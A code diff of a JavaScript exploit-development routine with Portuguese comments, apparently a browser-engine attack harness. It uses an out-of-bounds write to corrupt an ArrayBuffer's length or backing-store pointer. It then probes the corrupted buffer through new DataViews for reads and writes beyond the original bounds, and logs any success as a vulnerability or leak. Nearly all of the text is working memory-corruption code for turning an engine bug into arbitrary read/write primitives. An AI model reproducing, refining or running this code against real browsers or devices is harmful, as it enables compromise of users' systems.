@@ -12,7 +12,7 @@ export async function executeCorruptArrayBufferMetadataTest(
     offsetToCorrupt, 
     valueToWrite,    
     bytesToWrite,
-    isPointerCorruptionTest = false // Novo parâmetro para indicar se estamos testando corrupção de ponteiro
+    isPointerCorruptionTest = false // Parâmetro para indicar teste de corrupção de ponteiro
 ) {
     const FNAME_TEST = `executeCorruptMetadata<${testDescription}>`;
 
@@ -24,7 +24,7 @@ export async function executeCorruptArrayBufferMetadataTest(
     if (!oob_array_buffer_real) {
         logS3("Falha ao configurar ambiente OOB. Abortando.", "error", FNAME_TEST);
         document.title = "ERRO: Falha OOB Setup";
-        return { corruptionSucceeded: false, details: "OOB Setup Failed" };
+        return { corruptionSucceeded: false, details: "OOB Setup Failed", potentiallyCrashed: false };
     }
     document.title = "OOB Configurado";
 
@@ -37,9 +37,10 @@ export async function executeCorruptArrayBufferMetadataTest(
         newByteLength: "N/A",
         readBeyondOriginal: "Não tentado",
         writeBeyondOriginal: "Não tentado",
-        pointerReadAttempt: "Não aplicável"
+        pointerReadAttempt: "Não aplicável (não é teste de ponteiro ou não tentado)"
     };
-    let potentiallyCrashed = true; // Assumir que pode crashar até que o teste se prove estável
+    let potentiallyCrashed = true; 
+    let errorOccurred = false;
 
     try {
         if (offsetToCorrupt >= 0 && offsetToCorrupt + bytesToWrite <= initialOOBArrayBufferByteLength) {
@@ -53,101 +54,93 @@ export async function executeCorruptArrayBufferMetadataTest(
             stepReached = "apos_escrita_oob";
             document.title = `Após Escrita OOB Metadata: ${testDescription}`;
         } else {
-            logS3(`AVISO: Offset de corrupção de metadados ${toHex(offsetToCorrupt)} inválido para o tamanho ${initialOOBArrayBufferByteLength}. Escrita não realizada.`, "warn", FNAME_TEST);
+            logS3(`AVISO: Offset de corrupção ${toHex(offsetToCorrupt)} inválido para o tamanho ${initialOOBArrayBufferByteLength}. Escrita não realizada.`, "warn", FNAME_TEST);
             stepReached = "escrita_oob_pulada_offset_invalido";
             document.title = `Escrita OOB Pulada (Offset Inválido): ${testDescription}`;
-            potentiallyCrashed = false; // Não houve escrita, não deve crashar por isso
+            potentiallyCrashed = false; 
         }
 
         await PAUSE_S3(SHORT_PAUSE_S3);
 
         if (corruptionAttempted) {
-            testOutcome.newByteLength = oob_array_buffer_real.byteLength;
+            testOutcome.newByteLength = oob_array_buffer_real.byteLength; // Sempre verificar o tamanho
             logS3(`Tamanho de oob_array_buffer_real APÓS corrupção: ${testOutcome.newByteLength} bytes (${toHex(testOutcome.newByteLength)})`, "leak", FNAME_TEST);
-            if (testOutcome.newByteLength !== initialOOBArrayBufferByteLength) {
-                logS3("!!! SUCESSO ESPECULATIVO: oob_array_buffer_real.byteLength FOI ALTERADO !!!", "vuln", FNAME_TEST);
-                document.title = `SUCESSO: Tamanho AB Alterado! - ${testDescription}`;
-            } else {
-                logS3("Tamanho de oob_array_buffer_real NÃO foi alterado pela escrita.", "info", FNAME_TEST);
-            }
 
-            // Lógica de verificação pós-corrupção
-            try {
-                logS3("Criando nova DataView sobre o oob_array_buffer_real (potencialmente) corrompido...", "info", FNAME_TEST);
-                const corruptedView = new DataView(oob_array_buffer_real);
-                logS3(`Nova DataView criada. Comprimento da view (baseado no tamanho ATUAL do buffer): ${corruptedView.byteLength}`, "info", FNAME_TEST);
-
-                if (isPointerCorruptionTest) {
-                    logS3("Teste de Corrupção de Ponteiro: Tentando ler da DataView após corrupção do ponteiro...", "warn", FNAME_TEST);
-                    document.title = `Tentando Leitura Pós-PtrCorrupt: ${testDescription}`;
-                    stepReached = "antes_leitura_ptr_corrompido";
-                    try {
-                        let val = corruptedView.getUint32(0, true); // Tenta ler do início da DataView
-                        testOutcome.pointerReadAttempt = `Sucesso: Lido ${toHex(val)} de offset 0`;
-                        logS3(`   LEITURA PÓS-CORRUPÇÃO DE PONTEIRO BEM-SUCEDIDA (INESPERADO?): Valor lido = ${toHex(val)}`, "leak", FNAME_TEST);
-                        document.title = `LEITURA PÓS-PTR OK (INESPERADO): ${testDescription}`;
-                        potentiallyCrashed = false;
-                    } catch (e_ptr_read) {
-                        testOutcome.pointerReadAttempt = `ERRO: ${e_ptr_read.message}`;
-                        logS3(`   ERRO ESPERADO/CAPTurado ao tentar ler após corrupção de ponteiro: ${e_ptr_read.name} - ${e_ptr_read.message}`, "critical", FNAME_TEST);
-                        document.title = `ERRO Leitura Pós-PtrCorrupt: ${testDescription}`;
-                        // Este é um "sucesso" se esperávamos um crash/erro aqui.
-                        potentiallyCrashed = false; // Erro JS, não um crash de navegador não capturado.
-                    }
-                    stepReached = "apos_leitura_ptr_corrompido";
-
-                } else { // Teste de corrupção de tamanho
+            if (!isPointerCorruptionTest) { // Lógica para teste de corrupção de TAMANHO
+                if (testOutcome.newByteLength !== initialOOBArrayBufferByteLength) {
+                    logS3("!!! SUCESSO ESPECULATIVO: oob_array_buffer_real.byteLength FOI ALTERADO !!!", "vuln", FNAME_TEST);
+                    document.title = `SUCESSO: Tamanho AB Alterado! - ${testDescription}`;
+                } else {
+                    logS3("Tamanho de oob_array_buffer_real NÃO foi alterado pela escrita (teste de tamanho).", "info", FNAME_TEST);
+                }
+                // Tentar usar uma nova DataView com o buffer potencialmente corrompido (teste de tamanho)
+                try {
+                    const checkSizeView = new DataView(oob_array_buffer_real);
+                    logS3(`Nova DataView para teste de tamanho criada. Comprimento: ${checkSizeView.byteLength}`, "info", FNAME_TEST);
                     const testOffsetBeyondOriginal = initialOOBArrayBufferByteLength + 4;
                     const testValue = 0xABABABAB;
                     if (testOutcome.newByteLength > initialOOBArrayBufferByteLength && testOffsetBeyondOriginal + 4 <= testOutcome.newByteLength) {
-                        // ... (lógica de R/W além dos limites como antes) ...
-                         logS3(`Tentando escrever ${toHex(testValue)} em offset ${toHex(testOffsetBeyondOriginal)} (além do original) usando nova DataView...`, "warn", FNAME_TEST);
-                        corruptedView.setUint32(testOffsetBeyondOriginal, testValue, true);
-                        testOutcome.writeBeyondOriginal = `Escrito ${toHex(testValue)} em ${toHex(testOffsetBeyondOriginal)}`;
-                        
-                        let readBack = corruptedView.getUint32(testOffsetBeyondOriginal, true);
-                        testOutcome.readBeyondOriginal = `Lido ${toHex(readBack)} de ${toHex(testOffsetBeyondOriginal)}`;
+                        logS3(`Tentando R/W além dos limites (tamanho) em ${toHex(testOffsetBeyondOriginal)}...`, "warn", FNAME_TEST);
+                        checkSizeView.setUint32(testOffsetBeyondOriginal, testValue, true);
+                        let readBack = checkSizeView.getUint32(testOffsetBeyondOriginal, true);
                         if (readBack === testValue) {
-                            logS3(`!!! SUCESSO DE LEITURA/ESCRITA ALÉM DOS LIMITES !!! Leu ${toHex(readBack)}`, "critical", FNAME_TEST);
-                            document.title = `R/W OOB OBTIDO! - ${testDescription}`;
+                            logS3(`!!! SUCESSO R/W ALÉM DOS LIMITES (TAMANHO) !!! Leu ${toHex(readBack)}`, "critical", FNAME_TEST);
+                            document.title = `R/W OOB (Tamanho) OBTIDO! - ${testDescription}`;
                         } else {
-                            logS3(`Falha na verificação de R/W além dos limites. Lido: ${toHex(readBack)}, Esperado: ${toHex(testValue)}`, "error", FNAME_TEST);
+                            logS3(`Falha R/W além dos limites (tamanho). Lido: ${toHex(readBack)}`, "error", FNAME_TEST);
                         }
                     } else {
-                        logS3("Novo tamanho do buffer não é grande o suficiente para teste R/W além dos limites, ou não mudou.", "info", FNAME_TEST);
-                        testOutcome.readBeyondOriginal = "Não aplicável (tamanho insuficiente)";
-                        testOutcome.writeBeyondOriginal = "Não aplicável (tamanho insuficiente)";
+                        logS3("Novo tamanho do buffer (se alterado) não é grande o suficiente para teste R/W além dos limites, ou não mudou.", "info", FNAME_TEST);
                     }
-                    potentiallyCrashed = false; // Completou a lógica de tamanho
+                } catch (e_size_check) {
+                    logS3(`ERRO ao verificar R/W com tamanho corrompido: ${e_size_check.message}`, "error", FNAME_TEST);
                 }
-            } catch (e_view) { // Erro ao criar DataView ou na lógica de R/W
-                logS3(`ERRO ao usar nova DataView ou R/W: ${e_view.message}`, "error", FNAME_TEST);
-                document.title = `ERRO Nova DataView: ${testDescription}`;
-                testOutcome.pointerReadAttempt = testOutcome.pointerReadAttempt === "Não aplicável" ? `Erro DataView: ${e_view.message}` : testOutcome.pointerReadAttempt;
-                testOutcome.readBeyondOriginal = testOutcome.readBeyondOriginal === "Não tentado" ? `Erro DataView: ${e_view.message}` : testOutcome.readBeyondOriginal;
-                potentiallyCrashed = false; // Erro JS, não crash não capturado
+                potentiallyCrashed = false; // Completou a lógica de tamanho
+            } else { // Lógica para teste de corrupção de PONTEIRO
+                testOutcome.pointerReadAttempt = "Tentativa de leitura iniciada";
+                logS3("Teste de Corrupção de Ponteiro: Criando nova DataView e tentando ler do offset 0...", "warn", FNAME_TEST);
+                document.title = `Tentando Leitura Pós-PtrCorrupt: ${testDescription}`;
+                stepReached = "antes_leitura_ptr_corrompido";
+                try {
+                    const corruptedView = new DataView(oob_array_buffer_real); // Cria DataView após corrupção de ponteiro
+                    logS3(`Nova DataView para teste de ponteiro criada. Comprimento (baseado no tamanho NÃO ALTERADO do buffer): ${corruptedView.byteLength}`, "info", FNAME_TEST);
+                    let val = corruptedView.getUint32(0, true); // Tenta ler do início da DataView
+                    testOutcome.pointerReadAttempt = `Sucesso Leitura: Lido ${toHex(val)} de offset 0`;
+                    logS3(`   LEITURA PÓS-CORRUPÇÃO DE PONTEIRO BEM-SUCEDIDA (INESPERADO?): Valor lido = ${toHex(val)}`, "leak", FNAME_TEST);
+                    document.title = `LEITURA PÓS-PTR OK (INESPERADO): ${testDescription}`;
+                    potentiallyCrashed = false;
+                } catch (e_ptr_read) {
+                    testOutcome.pointerReadAttempt = `ERRO Leitura: ${e_ptr_read.name} - ${e_ptr_read.message}`;
+                    logS3(`   ERRO ESPERADO/CAPTURADO ao tentar ler após corrupção de ponteiro: ${e_ptr_read.name} - ${e_ptr_read.message}`, "critical", FNAME_TEST);
+                    document.title = `ERRO Leitura Pós-PtrCorrupt: ${testDescription}`;
+                    errorOccurred = true; 
+                    potentiallyCrashed = false; 
+                }
+                stepReached = "apos_leitura_ptr_corrompido";
             }
-        } else {
-            potentiallyCrashed = false; // Não houve escrita, não deve crashar por isso
+        } else { // corruptionAttempted foi false
+            potentiallyCrashed = false; 
         }
     } catch (mainError) {
         stepReached = "erro_principal";
         document.title = `ERRO Principal CorruptMetadata: ${testDescription}`;
         logS3(`Erro principal no teste de corrupção de metadados (${testDescription}): ${mainError.message}`, "error", FNAME_TEST);
         console.error(mainError);
-        potentiallyCrashed = false; // Erro JS, não crash não capturado
+        potentiallyCrashed = false; 
+        errorOccurred = true;
     } finally {
         clearOOBEnvironment();
         logS3(`Ambiente OOB Limpo. Último passo alcançado: ${stepReached}`, "info", FNAME_TEST);
         if (potentiallyCrashed && corruptionAttempted) {
-            logS3(`O TESTE PODE TER CONGELADO/CRASHADO ANTES DA VERIFICAÇÃO PÓS-CORRUPÇÃO. Último passo: ${stepReached}`, "error", FNAME_TEST);
+            logS3(`O TESTE PODE TER CONGELADO/CRASHADO. Último passo logado: ${stepReached}`, "error", FNAME_TEST);
             document.title = `CRASH/CONGELOU? Passo: ${stepReached} - ${testDescription}`;
         }
     }
     logS3(`--- Teste de Corrupção de Metadados AB Concluído: ${testDescription} ---`, "test", FNAME_TEST);
-    logS3(`   Detalhes Pós-Corrupção: Novo Tamanho=${testOutcome.newByteLength}, Escrita OOB="${testOutcome.writeBeyondOriginal}", Leitura OOB="${testOutcome.readBeyondOriginal}", Leitura Pós-PtrCorrupt="${testOutcome.pointerReadAttempt}"`, "info", FNAME_TEST);
+    logS3(`   Detalhes Pós-Corrupção: Novo Tamanho=${testOutcome.newByteLength}, Leitura Pós-PtrCorrupt="${testOutcome.pointerReadAttempt}"`, "info", FNAME_TEST);
     
     if (document.title.startsWith("Iniciando") || document.title.startsWith("OOB Configurado") || document.title.startsWith("Antes Escrita OOB")) {
-         if (!potentiallyCrashed) document.title = `Teste Metadata OK: ${testDescription}`;
+         if (!potentiallyCrashed && !errorOccurred) document.title = `Teste Metadata OK: ${testDescription}`;
     }
+    return { potentiallyCrashed, errorOccurred, details: testOutcome };
 }
